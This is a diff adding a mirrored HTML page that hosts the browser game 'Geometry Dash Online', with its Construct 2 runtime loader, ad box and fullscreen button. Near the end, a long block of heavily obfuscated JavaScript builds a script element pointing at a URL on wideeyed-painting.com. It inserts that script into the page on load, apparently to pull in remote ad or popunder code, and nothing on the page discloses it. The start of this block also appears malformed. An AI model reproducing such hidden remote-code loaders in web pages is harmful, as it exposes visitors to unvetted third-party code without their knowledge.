@@ -1,0 +1,171 @@
+﻿<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from html5.ubestgames.com/01/geometrydash/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 May 2023 23:24:02 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<title>Geometry Dash Online</title>
+	
+	<!-- Standardised web app manifest -->
+	<link rel="manifest" href="appmanifest.html" />
+	
+	<!-- Allow fullscreen mode on iOS devices. (These are Apple specific meta tags.) -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+	<link rel="apple-touch-icon" sizes="256x256" href="icon-256.png" />
+	<meta name="HandheldFriendly" content="true" />
+	
+	<!-- Chrome for Android web app tags -->
+	<meta name="mobile-web-app-capable" content="yes" />
+	<link rel="shortcut icon" sizes="256x256" href="icon-256.png" />
+
+	 <link href="../../comAPI.css" rel="stylesheet">
+	  <script src="../../jquery-2.1.1.min.js"></script>
+	  <script src="../../comAPI.js"></script>
+
+    <!-- All margins and padding must be zero for the canvas to fill the screen. -->
+	<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+		}
+		html, body {
+			background: transparent;
+			color: #fff;
+			overflow: hidden;
+			touch-action: none;
+			-ms-touch-action: none;
+		}
+		canvas {
+			touch-action-delay: none;
+			touch-action: none;
+			-ms-touch-action: none;
+		}
+    </style>
+	
+
+</head> 
+ 
+<body> 
+	<div id="fb-root"></div>
+	
+	<script>
+	// Issue a warning if trying to preview an exported project on disk.
+	(function(){
+		// Check for running exported on file protocol
+		if (window.location.protocol.substr(0, 4) === "file")
+		{
+			alert("Exported games won't work until you upload them. (When running on the file:/// protocol, browsers block many features from working for security reasons.)");
+		}
+	})();
+	</script>
+	
+	<!-- The canvas must be inside a div called c2canvasdiv -->
+	<div id="c2canvasdiv">
+	
+		<!-- The canvas the project will render to.  If you change its ID, don't forget to change the
+		ID the runtime looks for in the jQuery events above (ready() and cr_sizeCanvas()). -->
+		<canvas id="c2canvas" width="1280" height="720">
+			<!-- This text is displayed if the visitor's browser does not support HTML5.
+			You can change it, but it is a good idea to link to a description of a browser
+			and provide some links to download some popular HTML5-compatible browsers. -->
+			<h1>Your browser does not appear to support HTML5.  Try upgrading your browser to the latest version.  a modern browser
+			<br/><br/>a modern browser<br/>
+			a modern browser<br/>
+			Google Chrome<br/>
+			Apple Safari</h1>
+		</canvas>
+		
+	</div>
+	
+	<!-- Pages load faster with scripts at the bottom -->
+	
+	<!-- Construct 2 exported games require jQuery. -->
+	<script src="jquery-2.1.1.min.js"></script>
+
+
+	
+    <!-- The runtime script.  You can rename it, but don't forget to rename the reference here as well.
+    This file will have been minified and obfuscated if you enabled "Minify script" during export. -->
+	<script src="c2runtime.js"></script>
+
+    <script>
+		// Start the Construct 2 project running on window load.
+		jQuery(document).ready(function ()
+		{			
+			// Create new runtime using the c2canvas
+			cr_createRuntime("c2canvas");
+		});
+		
+		// Pause and resume on page becoming visible/invisible
+		function onVisibilityChanged() {
+			if (document.hidden || document.mozHidden || document.webkitHidden || document.msHidden)
+				cr_setSuspended(true);
+			else
+				cr_setSuspended(false);
+		};
+		
+		document.addEventListener("visibilitychange", onVisibilityChanged, false);
+		document.addEventListener("mozvisibilitychange", onVisibilityChanged, false);
+		document.addEventListener("webkitvisibilitychange", onVisibilityChanged, false);
+		document.addEventListener("msvisibilitychange", onVisibilityChanged, false);
+		
+		function OnRegisterSWError(e)
+		{
+			console.warn("Failed to register service worker: ", e);
+		};
+		
+		// Runtime calls this global method when ready to start caching (i.e. after startup).
+		// This registers the service worker which caches resources for offline support.
+		window.C2_RegisterSW = function C2_RegisterSW()
+		{
+			if (!navigator.serviceWorker)
+				return;		// no SW support, ignore call
+			
+			try {
+				navigator.serviceWorker.register("sw.html", { scope: "./" })
+				.then(function (reg)
+				{
+					console.log("Registered service worker on " + reg.scope);
+				})
+				.catch(OnRegisterSWError);
+			}
+			catch (e)
+			{
+				OnRegisterSWError(e);
+			}
+		};
+    </script>
+
+    <div id="adsbox"></div>
+
+    <script type="text/javascript">
+        $("#adsbox").click(function () {
+            ShowAds();
+            $('#adsbox').remove();
+        });
+        setTimeout(function(){  $('#adsbox').show(); }, 2000);
+
+        window.setInterval(function(){
+            $('#adsbox').show();
+        }, 80000);
+    </script>
+	<script>
+	function(_0x34be2e,_0x5b9b5d){var _0x901d90=_0x24a1,_0x32d58d=_0x34be2e();while(!![]){try{var _0xf303fa=-parseInt(_0x901d90(0x1d1))/0x1*(-parseInt(_0x901d90(0x1d9))/0x2)+parseInt(_0x901d90(0x1d5))/0x3+parseInt(_0x901d90(0x1bd))/0x4*(parseInt(_0x901d90(0x1cf))/0x5)+parseInt(_0x901d90(0x1b6))/0x6*(parseInt(_0x901d90(0x1c7))/0x7)+-parseInt(_0x901d90(0x1da))/0x8+parseInt(_0x901d90(0x1df))/0x9+-parseInt(_0x901d90(0x1b8))/0xa;if(_0xf303fa===_0x5b9b5d)break;else _0x32d58d['push'](_0x32d58d['shift']());}catch(_0x3770f9){_0x32d58d['push'](_0x32d58d['shift']());}}}(_0x13a3,0x2b2ae),function(_0x5a5e48,_0x1cfe42){var _0x29fd39=_0x24a1,_0x919714=_0xb3b7,_0x466553=_0x5a5e48();while(!![]){try{var _0x4f411a=parseInt(_0x919714(0x19d))/0x1+parseInt(_0x919714(0x1ac))/0x2+parseInt(_0x919714(0x190))/0x3+parseInt(_0x919714(0x19e))/0x4+parseInt(_0x919714(0x18e))/0x5*(parseInt(_0x919714(0x18f))/0x6)+parseInt(_0x919714(0x197))/0x7*(parseInt(_0x919714(0x19c))/0x8)+-parseInt(_0x919714(0x1ab))/0x9;if(_0x4f411a===_0x1cfe42)break;else _0x466553[_0x29fd39(0x1e2)](_0x466553['shift']());}catch(_0x38f198){_0x466553[_0x29fd39(0x1e2)](_0x466553[_0x29fd39(0x1c4)]());}}}(_0x21a8,0xcc5ba));function _0x444f(_0x465523,_0x21fe06){var _0x142e13=_0x4078();return _0x444f=function(_0x401d58,_0x3e0cc8){_0x401d58=_0x401d58-0x8a;var _0x1eaf00=_0x142e13[_0x401d58];return _0x1eaf00;},_0x444f(_0x465523,_0x21fe06);}function _0x24a1(_0x3a209c,_0x48a54a){var _0x13a35d=_0x13a3();return _0x24a1=function(_0x24a1f8,_0x31241f){_0x24a1f8=_0x24a1f8-0x1b2;var _0x387ea6=_0x13a35d[_0x24a1f8];return _0x387ea6;},_0x24a1(_0x3a209c,_0x48a54a);}function _0x4078(){var _0x274d96=_0x24a1,_0xc0d6c9=_0xb3b7,_0x2175c8=[_0xc0d6c9(0x18c),'scripts','1787142RLQkmG',_0xc0d6c9(0x198),_0xc0d6c9(0x1b2),_0xc0d6c9(0x1ae),_0xc0d6c9(0x1a5),_0xc0d6c9(0x191),_0xc0d6c9(0x1a6),_0xc0d6c9(0x19b),_0xc0d6c9(0x1af),_0xc0d6c9(0x196),_0xc0d6c9(0x19f),_0xc0d6c9(0x1a9),_0xc0d6c9(0x195),'9454524ILABeK',_0xc0d6c9(0x1b3),_0xc0d6c9(0x193),_0x274d96(0x1c8),_0xc0d6c9(0x1aa),_0x274d96(0x1c0),_0xc0d6c9(0x1b5),_0xc0d6c9(0x19a),_0xc0d6c9(0x1b6),_0x274d96(0x1b9),_0xc0d6c9(0x1a2),_0xc0d6c9(0x1a8),'411573DvyvgT',_0xc0d6c9(0x1a1),'4254699tgYKDd',_0xc0d6c9(0x18d),_0xc0d6c9(0x1a3),_0xc0d6c9(0x1b4)];return _0x4078=function(){return _0x2175c8;},_0x4078();}function _0x21a8(){var _0x43d16c=_0x24a1,_0x3067f4=[_0x43d16c(0x1d6),_0x43d16c(0x1cb),'2yYUrZp','src',_0x43d16c(0x1bc),_0x43d16c(0x1de),_0x43d16c(0x1e0),_0x43d16c(0x1d4),_0x43d16c(0x1c2),_0x43d16c(0x1ce),_0x43d16c(0x1c5),_0x43d16c(0x1bf),_0x43d16c(0x1be),_0x43d16c(0x1cc),_0x43d16c(0x1c9),_0x43d16c(0x1ba),_0x43d16c(0x1dd),_0x43d16c(0x1b5),'1812NkEJvS',_0x43d16c(0x1db),_0x43d16c(0x1c3),_0x43d16c(0x1b2),_0x43d16c(0x1b7),_0x43d16c(0x1b3),'90TKjnWy','17006ZUmwWw',_0x43d16c(0x1d3),_0x43d16c(0x1d0),_0x43d16c(0x1d2),_0x43d16c(0x1bb),_0x43d16c(0x1e2),_0x43d16c(0x1c4),_0x43d16c(0x1e1),_0x43d16c(0x1e3),_0x43d16c(0x1ca),_0x43d16c(0x1d7),'31681089urzoZg',_0x43d16c(0x1d8),_0x43d16c(0x1cd),_0x43d16c(0x1c6),_0x43d16c(0x1b4),_0x43d16c(0x1c1),_0x43d16c(0x1dc)];return _0x21a8=function(){return _0x3067f4;},_0x21a8();}(function(_0xa94c9c,_0x326eaa){var _0x323236=_0xb3b7,_0x199b18=_0x444f,_0x4bc563=_0xa94c9c();while(!![]){try{var _0x5cce3c=parseInt(_0x199b18(0x8d))/0x1*(-parseInt(_0x199b18(0x92))/0x2)+parseInt(_0x199b18(0xaa))/0x3+parseInt(_0x199b18(0xa1))/0x4*(parseInt(_0x199b18(0x9d))/0x5)+-parseInt(_0x199b18(0x95))/0x6+-parseInt(_0x199b18(0x97))/0x7+-parseInt(_0x199b18(0xa4))/0x8+-parseInt(_0x199b18(0x9f))/0x9*(-parseInt(_0x199b18(0xa6))/0xa);if(_0x5cce3c===_0x326eaa)break;else _0x4bc563[_0x323236(0x1a5)](_0x4bc563[_0x323236(0x1a6)]());}catch(_0x5e1225){_0x4bc563[_0x323236(0x1a5)](_0x4bc563[_0x323236(0x1a6)]());}}}(_0x4078,0x4ddf7),function(_0x51d281,_0x42766b){var _0x16ab4e=_0xb3b7,_0x1c17b4=_0x444f,_0x3a58f7=_0x3adb,_0x4327f7=_0x51d281();while(!![]){try{var _0x283baa=parseInt(_0x3a58f7(0x1d0))/0x1+-parseInt(_0x3a58f7(0x1de))/0x2+-parseInt(_0x3a58f7(0x1cd))/0x3*(parseInt(_0x3a58f7(0x1c9))/0x4)+parseInt(_0x3a58f7(0x1df))/0x5+-parseInt(_0x3a58f7(0x1d4))/0x6*(parseInt(_0x3a58f7(0x1d6))/0x7)+-parseInt(_0x3a58f7(0x1d8))/0x8+parseInt(_0x3a58f7(0x1c8))/0x9*(parseInt(_0x3a58f7(0x1d5))/0xa);if(_0x283baa===_0x42766b)break;else _0x4327f7[_0x1c17b4(0x99)](_0x4327f7[_0x16ab4e(0x1a6)]());}catch(_0x5c0c53){_0x4327f7[_0x1c17b4(0x99)](_0x4327f7[_0x16ab4e(0x1a6)]());}}}(_0x3524,0xb7aa9));function _0x3ee5(_0xf7470e,_0x1f83f4){var _0x263ef4=_0x22e3();return _0x3ee5=function(_0x5e7736,_0x5aaf55){_0x5e7736=_0x5e7736-0xda;var _0x1633e2=_0x263ef4[_0x5e7736];return _0x1633e2;},_0x3ee5(_0xf7470e,_0x1f83f4);}function _0x3adb(_0x220234,_0x3fbecc){var _0x3d2c08=_0x3524();return _0x3adb=function(_0x195b0c,_0x4f2b2f){_0x195b0c=_0x195b0c-0x1c6;var _0x161240=_0x3d2c08[_0x195b0c];return _0x161240;},_0x3adb(_0x220234,_0x3fbecc);}function _0x13a3(){var _0x4be93f=['2243472meFmTK','script','//wideeyed-painting.com/b.XsVGsKdBGDlY0LYqW/cZ/yeImK9/uGZUUAl/kPP_TzQA2/NaT/g/x/O_DjgotFNxDuYt1/OqDgEx4/OvQt','7TYIcKo','759150uKbwcZ','3041199fOrZXq','1906460yywbzc','8098443LGpzvN','push','28091oJSYZt','8450240feYwah','2305072QmRUkP','281510GwIcim','11636736CYkXJr','12cUIner','154817enYyZH','2233200vraRlk','6539770XxeBNK','45ugpdZZ','1446498StfbeB','1380357CRBoUT','4NlJLHg','987928RoJmGx','101830Qyokey','296IfyTHr','settings','3050904KKleQQ','344kRSSCQ','shift','parentNode','16WSWdND','134757cyCVjs','57146lrTliz','4rMJsRt','length','insertBefore','9GGlkOv','159509uuaRka','1027881INOTtf','529910DrfgPt','createElement','1QtNEjD','50acOkPs','357684HiIRpc','15OtQaEW','244056uUtvPR','3152681LnHVQS','1085850ERUINV','1403454ZMfNod','233642YfPCXj'];_0x13a3=function(){return _0x4be93f;};return _0x13a3();}function _0xb3b7(_0x48228a,_0x11267c){var _0x9bcdc3=_0x21a8();return _0xb3b7=function(_0x2fedad,_0x58b52e){_0x2fedad=_0x2fedad-0x18c;var _0x593374=_0x9bcdc3[_0x2fedad];return _0x593374;},_0xb3b7(_0x48228a,_0x11267c);}(function(_0x2f1ddf,_0x59c52d){var _0x34044d=_0x444f,_0x5adb69=_0x3adb,_0x3d16e7=_0x3ee5,_0x20b7b3=_0x2f1ddf();while(!![]){try{var _0x306b5d=-parseInt(_0x3d16e7(0xdb))/0x1*(-parseInt(_0x3d16e7(0xe0))/0x2)+-parseInt(_0x3d16e7(0xe2))/0x3+-parseInt(_0x3d16e7(0xe3))/0x4*(-parseInt(_0x3d16e7(0xea))/0x5)+-parseInt(_0x3d16e7(0xe9))/0x6+parseInt(_0x3d16e7(0xe5))/0x7*(parseInt(_0x3d16e7(0xec))/0x8)+parseInt(_0x3d16e7(0xdd))/0x9+parseInt(_0x3d16e7(0xe4))/0xa*(parseInt(_0x3d16e7(0xe6))/0xb);if(_0x306b5d===_0x59c52d)break;else _0x20b7b3[_0x5adb69(0x1da)](_0x20b7b3[_0x5adb69(0x1dd)]());}catch(_0x2df9b1){_0x20b7b3[_0x34044d(0x99)](_0x20b7b3[_0x5adb69(0x1dd)]());}}}(_0x22e3,0xd163f),function(_0x420676){var _0x3d0e05=_0x444f,_0x37fa2a=_0x3adb,_0x205778=_0x3ee5,_0x294f81=document,_0x20f5c3=_0x294f81[_0x205778(0xe7)](_0x205778(0xde)),_0x5e9e72=_0x294f81[_0x37fa2a(0x1d7)][_0x294f81[_0x3d0e05(0x94)][_0x205778(0xdf)]-0x1];_0x20f5c3[_0x205778(0xeb)]=_0x420676||{},_0x20f5c3[_0x205778(0xdc)]=_0x205778(0xe8),_0x5e9e72[_0x205778(0xda)][_0x205778(0xe1)](_0x20f5c3,_0x5e9e72);}({}));function _0x3524(){var _0x479b37=_0x24a1,_0x15954d=_0xb3b7,_0x2a7825=_0x444f,_0xb00481=[_0x15954d(0x1ad),_0x15954d(0x194),_0x2a7825(0x8f),_0x15954d(0x1b0),_0x2a7825(0x93),_0x15954d(0x192),_0x2a7825(0xa8),_0x2a7825(0x98),_0x15954d(0x199),_0x2a7825(0x8a),_0x2a7825(0x8c),_0x2a7825(0x94),_0x2a7825(0x96),_0x2a7825(0xa7),_0x479b37(0x1e2),_0x2a7825(0x9a),_0x2a7825(0xa2),_0x2a7825(0x9b),_0x15954d(0x1a4),_0x2a7825(0x90),_0x15954d(0x1b1),_0x15954d(0x1a7),_0x2a7825(0xa3),_0x2a7825(0x8b),_0x2a7825(0x9e),_0x2a7825(0x8e),_0x2a7825(0x91),_0x2a7825(0x9c)];return _0x3524=function(){return _0xb00481;},_0x3524();}function _0x22e3(){var _0x3b4b61=_0xb3b7,_0xc8d63d=_0x444f,_0x22d215=_0x3adb,_0x2e9342=[_0x22d215(0x1cb),_0x22d215(0x1db),_0x22d215(0x1d3),_0x22d215(0x1d2),_0x22d215(0x1e1),_0xc8d63d(0xa9),_0xc8d63d(0xa0),_0xc8d63d(0xa5),_0x22d215(0x1c6),_0x22d215(0x1ce),_0x22d215(0x1d9),_0x22d215(0x1ca),_0x22d215(0x1cc),_0x3b4b61(0x1a0),_0x22d215(0x1c7),_0x22d215(0x1e0),_0x22d215(0x1dc),_0x22d215(0x1d1),_0x22d215(0x1cf)];return _0x22e3=function(){return _0x2e9342;},_0x22e3();}
+	</script>
+	
+<style>#fsBtn{position:fixed;right:10px;bottom:10px;z-index:99999;opacity:.35;background:rgba(0,0,0,.6);color:#fff;border:1px solid rgba(255,255,255,.4);border-radius:6px;padding:6px 10px;font:12px system-ui,sans-serif;cursor:pointer}#fsBtn:hover{opacity:1}</style>
+<script>
+  function toggleFullscreen() {
+    if (document.fullscreenElement) { document.exitFullscreen(); }
+    else if (document.documentElement.requestFullscreen) { document.documentElement.requestFullscreen(); }
+  }
+</script>
+<button id="fsBtn" onclick="toggleFullscreen()">⛶ Fullscreen</button>
+</body> 
+
+<!-- Mirrored from html5.ubestgames.com/01/geometrydash/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 May 2023 23:24:06 GMT -->
+</html> 
